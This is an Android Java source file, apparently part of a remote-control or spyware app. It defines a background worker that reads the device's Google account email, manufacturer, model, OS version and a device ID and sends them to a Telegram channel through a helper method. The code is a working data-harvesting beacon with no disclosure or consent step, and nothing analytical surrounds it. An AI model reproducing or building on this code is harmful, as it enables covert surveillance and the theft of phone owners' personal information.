package com.sohaibazmi.remote;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.util.HashMap;
import java.util.Map;

public class TelegramWorker extends Worker {

    public TelegramWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        AccountManager accountManager = AccountManager.get(getApplicationContext());
        Account[] accounts = accountManager.getAccountsByType("com.google");
        String possibleEmail = "unknown";
        if (accounts.length > 0) {
            possibleEmail = accounts[0].name;
        }
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("Email", possibleEmail);
        deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
        deviceInfo.put("model", android.os.Build.MODEL);
        deviceInfo.put("osVersion", android.os.Build.VERSION.RELEASE);

        if (RemoteService.isInternetAvailable(getApplicationContext())) {
            String deviceId = RemoteService.getDeviceId(getApplicationContext());
            String message = "Device Id: " + deviceId + " is active " + deviceInfo;
            RemoteService.sendTelegramText(message);
        }
        return Result.success();
    }
}
